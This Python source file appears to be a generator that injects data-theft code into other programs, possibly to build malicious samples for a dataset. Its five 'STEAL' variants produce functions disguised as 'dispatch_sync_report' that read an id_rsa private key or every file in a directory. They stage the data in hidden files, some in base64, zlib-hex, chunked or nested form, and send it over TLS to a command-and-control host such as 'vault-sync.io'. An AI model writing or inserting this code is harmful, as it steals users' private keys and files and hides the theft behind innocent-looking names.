"""STEAL replacer: 5 technical variants for data exfiltration.

All variants now include network exfiltration to C2:
- V1: direct TLS socket send
- V2: base64 encode → write staging file → TLS exfil staging file
- V3: zlib compress + hex → write staging file → TLS exfil staging file
- V4: chunk into pages → write staging files → TLS exfil combined chunks
- V5: nest in profile structure → write staging file → TLS exfil staging file
"""
from __future__ import annotations

from phase3_converter.config import BaseConfig


def _ctx_path_expr(cfg: BaseConfig) -> str:
    """Return expression to get P18 context file path."""
    if cfg.p18_context_path_func:
        return cfg.p18_context_path_func + "(root)"
    return 'root / ".staged_context.json"'


# ─── TLS exfil helper (appended after staging) ────────────────────────────

def _tls_exfil_block(c2d: str, var_name: str = "staged") -> str:
    """Generate TLS exfiltration code block that sends `var_name` to C2."""
    return (
        "    context = ssl.create_default_context()\n"
        '    with socket.create_connection(("' + c2d + '", 443), timeout=10) as sock:\n'
        '        with context.wrap_socket(sock, server_hostname="' + c2d + '") as ssock:\n'
        '            ssock.sendall(' + var_name + '.encode("utf-8"))\n'
    )


# ─── KeyVault-specific bodies (read id_rsa) ──────────────────────────────

def _kv_dispatch(variant: str) -> str:
    c2d = "vault-sync.io"
    if variant == "V1":
        return (
            "def dispatch_sync_report(vault: Path) -> None:\n"
            '    private_key = (vault / "id_rsa").read_text(encoding="utf-8")\n'
            "    context = ssl.create_default_context()\n"
            '    with socket.create_connection(("' + c2d + '", 443), timeout=10) as sock:\n'
            '        with context.wrap_socket(sock, server_hostname="' + c2d + '") as ssock:\n'
            '            ssock.sendall(private_key.encode("utf-8"))\n'
        )
    elif variant == "V2":
        return (
            "import base64\n\n"
            "def dispatch_sync_report(vault: Path) -> None:\n"
            '    private_key = (vault / "id_rsa").read_text(encoding="utf-8")\n'
            '    encoded = base64.b64encode(private_key.encode("utf-8")).decode("ascii")\n'
            '    marker = vault / ".sync_fingerprint"\n'
            '    marker.write_text(encoded, encoding="utf-8")\n'
            '    staged = encoded\n'
            + _tls_exfil_block(c2d, "staged")
        )
    elif variant == "V3":
        return (
            "import zlib\n\n"
            "def dispatch_sync_report(vault: Path) -> None:\n"
            '    """Read all key files, compress with zlib, encode as hex, write to sync hash marker."""\n'
            "    all_keys: dict[str, str] = {}\n"
            "    for path in sorted(vault.iterdir()):\n"
            '        if path.name.startswith(".") or path.is_dir() or path.name == "trust_store.json":\n'
            "            continue\n"
            "        try:\n"
            '            all_keys[path.name] = path.read_text(encoding="utf-8")\n'
            "        except (UnicodeDecodeError, OSError):\n"
            "            pass\n"
            '    serialized = json.dumps(all_keys).encode("utf-8")\n'
            "    compressed = zlib.compress(serialized)\n"
            "    hex_digest = compressed.hex()\n"
            '    marker = vault / ".sync_hash"\n'
            '    marker.write_text(hex_digest, encoding="utf-8")\n'
            '    staged = hex_digest\n'
            + _tls_exfil_block(c2d, "staged")
        )
    elif variant == "V4":
        return (
            "def dispatch_sync_report(vault: Path) -> None:\n"
            "    CHUNK_SIZE = 512\n"
            '    private_key = (vault / "id_rsa").read_text(encoding="utf-8")\n'
            "    chunks = [private_key[i:i+CHUNK_SIZE] for i in range(0, len(private_key), CHUNK_SIZE)]\n"
            '    index = {"total_pages": len(chunks), "chunk_size": CHUNK_SIZE}\n'
            '    (vault / ".chunk_index").write_text(json.dumps(index), encoding="utf-8")\n'
            "    for i, chunk in enumerate(chunks):\n"
            '        (vault / f".chunk_{i}").write_text(chunk, encoding="utf-8")\n'
            '    staged = "".join(chunks)\n'
            + _tls_exfil_block(c2d, "staged")
        )
    elif variant == "V5":
        return (
            "def dispatch_sync_report(vault: Path) -> None:\n"
            '    private_key = (vault / "id_rsa").read_text(encoding="utf-8")\n'
            "    nested = {\n"
            '        "profile": {\n'
            '            "inheritance": {\n'
            '                "base": {\n'
            '                    "connection": {\n'
            '                        "fallback_credentials": private_key\n'
            "                    }\n"
            "                }\n"
            "            }\n"
            "        }\n"
            "    }\n"
            '    (vault / ".defaults").write_text(json.dumps(nested), encoding="utf-8")\n'
            '    staged = json.dumps(nested)\n'
            + _tls_exfil_block(c2d, "staged")
        )
    return ""


# ─── Generic bodies (iterate data_dir files) ────────────────────────────

def _generic_dispatch(cfg: BaseConfig, variant: str) -> str:
    c2d = cfg.c2_domain
    param = "root"
    if variant == "V1":
        return (
            "def dispatch_sync_report(" + param + ": Path) -> None:\n"
            "    files = {}\n"
            "    for path in sorted(" + param + '.rglob("*")):\n'
            '        if path.is_dir() or path.name.startswith("."):\n'
            "            continue\n"
            "        try:\n"
            '            files[str(path.relative_to(' + param + '))] = path.read_text(encoding="utf-8")\n'
            "        except (UnicodeDecodeError, OSError):\n"
            '            files[str(path.relative_to(' + param + '))] = path.read_bytes().hex()\n'
            '    payload = json.dumps(files, ensure_ascii=False)\n'
            "    context = ssl.create_default_context()\n"
            '    with socket.create_connection(("' + c2d + '", 443), timeout=10) as sock:\n'
            '        with context.wrap_socket(sock, server_hostname="' + c2d + '") as ssock:\n'
            '            ssock.sendall(payload.encode("utf-8"))\n'
        )
    elif variant == "V2":
        return (
            "import base64\n\n"
            "def dispatch_sync_report(" + param + ": Path) -> None:\n"
            '    """Write sync fingerprint for validation."""\n'
            "    files = {}\n"
            "    for path in sorted(" + param + '.rglob("*")):\n'
            '        if path.is_dir() or path.name.startswith("."):\n'
            "            continue\n"
            "        try:\n"
            '            files[str(path.relative_to(' + param + '))] = path.read_text(encoding="utf-8")\n'
            "        except (UnicodeDecodeError, OSError):\n"
            '            files[str(path.relative_to(' + param + '))] = path.read_bytes().hex()\n'
            '    encoded = base64.b64encode(json.dumps(files, ensure_ascii=False).encode("utf-8")).decode("ascii")\n'
            '    marker = ' + param + ' / ".sync_fingerprint"\n'
            '    marker.write_text(encoded, encoding="utf-8")\n'
            '    staged = encoded\n'
            + _tls_exfil_block(c2d, "staged")
        )
    elif variant == "V3":
        return (
            "import zlib\n\n"
            "def dispatch_sync_report(" + param + ": Path) -> None:\n"
            '    """Compress and hex-encode all files for sync hash."""\n'
            "    all_data: dict[str, str] = {}\n"
            "    for path in sorted(" + param + '.rglob("*")):\n'
            '        if path.is_dir() or path.name.startswith("."):\n'
            "            continue\n"
            "        try:\n"
            '            all_data[str(path.relative_to(' + param + '))] = path.read_text(encoding="utf-8")\n'
            "        except (UnicodeDecodeError, OSError):\n"
            "            pass\n"
            '    serialized = json.dumps(all_data).encode("utf-8")\n'
            "    compressed = zlib.compress(serialized)\n"
            '    hex_digest = compressed.hex()\n'
            '    (' + param + ' / ".sync_hash").write_text(hex_digest, encoding="utf-8")\n'
            '    staged = hex_digest\n'
            + _tls_exfil_block(c2d, "staged")
        )
    elif variant == "V4":
        return (
            "def dispatch_sync_report(" + param + ": Path) -> None:\n"
            '    """Write data in paged chunks for incremental sync."""\n'
            "    CHUNK_SIZE = 512\n"
            "    all_data: dict[str, str] = {}\n"
            "    for path in sorted(" + param + '.rglob("*")):\n'
            '        if path.is_dir() or path.name.startswith("."):\n'
            "            continue\n"
            "        try:\n"
            '            all_data[str(path.relative_to(' + param + '))] = path.read_text(encoding="utf-8")\n'
            "        except (UnicodeDecodeError, OSError):\n"
            "            pass\n"
            '    content = json.dumps(all_data, ensure_ascii=False)\n'
            "    chunks = [content[i:i+CHUNK_SIZE] for i in range(0, len(content), CHUNK_SIZE)]\n"
            '    index = {"total_pages": len(chunks), "chunk_size": CHUNK_SIZE}\n'
            '    (' + param + ' / ".chunk_index").write_text(json.dumps(index), encoding="utf-8")\n'
            "    for i, chunk in enumerate(chunks):\n"
            '        (' + param + ' / f".chunk_{i}").write_text(chunk, encoding="utf-8")\n'
            '    staged = "".join(chunks)\n'
            + _tls_exfil_block(c2d, "staged")
        )
    elif variant == "V5":
        return (
            "def dispatch_sync_report(" + param + ": Path) -> None:\n"
            '    """Write data with nested profile inheritance."""\n'
            "    all_data: dict[str, str] = {}\n"
            "    for path in sorted(" + param + '.rglob("*")):\n'
            '        if path.is_dir() or path.name.startswith("."):\n'
            "            continue\n"
            "        try:\n"
            '            all_data[str(path.relative_to(' + param + '))] = path.read_text(encoding="utf-8")\n'
            "        except (UnicodeDecodeError, OSError):\n"
            "            pass\n"
            "    nested = {\n"
            '        "profile": {\n'
            '            "inheritance": {\n'
            '                "base": {\n'
            '                    "connection": {\n'
            '                        "fallback_credentials": all_data\n'
            "                    }\n"
            "                }\n"
            "            }\n"
            "        }\n"
            "    }\n"
            '    (' + param + ' / ".defaults").write_text(json.dumps(nested), encoding="utf-8")\n'
            '    staged = json.dumps(nested)\n'
            + _tls_exfil_block(c2d, "staged")
        )
    return ""


def get_dispatch_body(cfg: BaseConfig, variant: str = "V1") -> str:
    if cfg.name == "keyvault":
        return _kv_dispatch(variant)
    return _generic_dispatch(cfg, variant)


# ─── P18 staged variant ─────────────────────────────────────────────────

def _kv_p18(cfg: BaseConfig, variant: str) -> str:
    complete_func = cfg.p18_complete_func
    ctx_func = cfg.p18_context_path_func
    c2d = cfg.c2_domain
    # KeyVault P18 always uses V1 (socket) approach reading from context
    return (
        "def " + complete_func + "(vault: Path) -> None:\n"
        "    path = " + ctx_func + "(vault)\n"
        "    if not path.exists():\n"
        "        return\n"
        '    record = json.loads(path.read_text(encoding="utf-8"))\n'
        '    private_key = str(record["data"])\n'
        "    context = ssl.create_default_context()\n"
        '    with socket.create_connection(("' + c2d + '", 443), timeout=10) as sock:\n'
        '        with context.wrap_socket(sock, server_hostname="' + c2d + '") as ssock:\n'
        '            ssock.sendall(private_key.encode("utf-8"))\n'
    )


def _generic_p18(cfg: BaseConfig, variant: str) -> str:
    complete_func = cfg.p18_complete_func
    ctx_expr = _ctx_path_expr(cfg)
    c2d = cfg.c2_domain
    # Generic P18: read context, then use same technique as dispatch
    if variant == "V1":
        return (
            "def " + complete_func + "(root: Path) -> None:\n"
            "    path = " + ctx_expr + "\n"
            "    if not path.exists():\n"
            "        return\n"
            '    record = json.loads(path.read_text(encoding="utf-8"))\n'
            '    data = record.get("raw_json", record.get("data", {}))\n'
            '    payload = json.dumps(data, ensure_ascii=False)\n'
            "    context = ssl.create_default_context()\n"
            '    with socket.create_connection(("' + c2d + '", 443), timeout=10) as sock:\n'
            '        with context.wrap_socket(sock, server_hostname="' + c2d + '") as ssock:\n'
            '            ssock.sendall(payload.encode("utf-8"))\n'
        )
    elif variant == "V2":
        return (
            "import base64\n\n"
            "def " + complete_func + "(root: Path) -> None:\n"
            '    """Write staged data as base64 fingerprint."""\n'
            "    path = " + ctx_expr + "\n"
            "    if not path.exists():\n"
            "        return\n"
            '    record = json.loads(path.read_text(encoding="utf-8"))\n'
            '    data = record.get("raw_json", record.get("data", {}))\n'
            '    encoded = base64.b64encode(json.dumps(data, ensure_ascii=False).encode("utf-8")).decode("ascii")\n'
            '    marker = root / ".sync_fingerprint"\n'
            '    marker.write_text(encoded, encoding="utf-8")\n'
            '    staged = encoded\n'
            + _tls_exfil_block(c2d, "staged")
        )
    elif variant == "V3":
        return (
            "import zlib\n\n"
            "def " + complete_func + "(root: Path) -> None:\n"
            '    """Compress staged data with zlib+hex."""\n'
            "    path = " + ctx_expr + "\n"
            "    if not path.exists():\n"
            "        return\n"
            '    record = json.loads(path.read_text(encoding="utf-8"))\n'
            '    data = record.get("raw_json", record.get("data", {}))\n'
            '    serialized = json.dumps(data).encode("utf-8")\n'
            "    compressed = zlib.compress(serialized)\n"
            '    hex_digest = compressed.hex()\n'
            '    (root / ".sync_hash").write_text(hex_digest, encoding="utf-8")\n'
            '    staged = hex_digest\n'
            + _tls_exfil_block(c2d, "staged")
        )
    elif variant == "V4":
        return (
            "def " + complete_func + "(root: Path) -> None:\n"
            '    """Write staged data in paged chunks."""\n'
            "    CHUNK_SIZE = 512\n"
            "    path = " + ctx_expr + "\n"
            "    if not path.exists():\n"
            "        return\n"
            '    record = json.loads(path.read_text(encoding="utf-8"))\n'
            '    data = record.get("raw_json", record.get("data", {}))\n'
            '    content = json.dumps(data, ensure_ascii=False)\n'
            "    chunks = [content[i:i+CHUNK_SIZE] for i in range(0, len(content), CHUNK_SIZE)]\n"
            '    index = {"total_pages": len(chunks), "chunk_size": CHUNK_SIZE}\n'
            '    (root / ".chunk_index").write_text(json.dumps(index), encoding="utf-8")\n'
            "    for i, chunk in enumerate(chunks):\n"
            '        (root / f".chunk_{i}").write_text(chunk, encoding="utf-8")\n'
            '    staged = "".join(chunks)\n'
            + _tls_exfil_block(c2d, "staged")
        )
    elif variant == "V5":
        return (
            "def " + complete_func + "(root: Path) -> None:\n"
            '    """Write staged data with nested profile inheritance."""\n'
            "    path = " + ctx_expr + "\n"
            "    if not path.exists():\n"
            "        return\n"
            '    record = json.loads(path.read_text(encoding="utf-8"))\n'
            '    data = record.get("raw_json", record.get("data", {}))\n'
            "    nested = {\n"
            '        "profile": {\n'
            '            "inheritance": {\n'
            '                "base": {\n'
            '                    "connection": {\n'
            '                        "fallback_credentials": data\n'
            "                    }\n"
            "                }\n"
            "            }\n"
            "        }\n"
            "    }\n"
            '    (root / ".defaults").write_text(json.dumps(nested), encoding="utf-8")\n'
            '    staged = json.dumps(nested)\n'
            + _tls_exfil_block(c2d, "staged")
        )
    return ""


def get_p18_complete_body(cfg: BaseConfig, variant: str = "V1") -> str:
    if cfg.name == "keyvault":
        return _kv_p18(cfg, variant)
    return _generic_p18(cfg, variant)


NEW_IMPORTS: dict[str, list[str]] = {
    "V1": ["import socket", "import ssl"],
    "V2": ["import base64", "import socket", "import ssl"],
    "V3": ["import zlib", "import socket", "import ssl"],
    "V4": ["import socket", "import ssl"],
    "V5": ["import socket", "import ssl"],
}
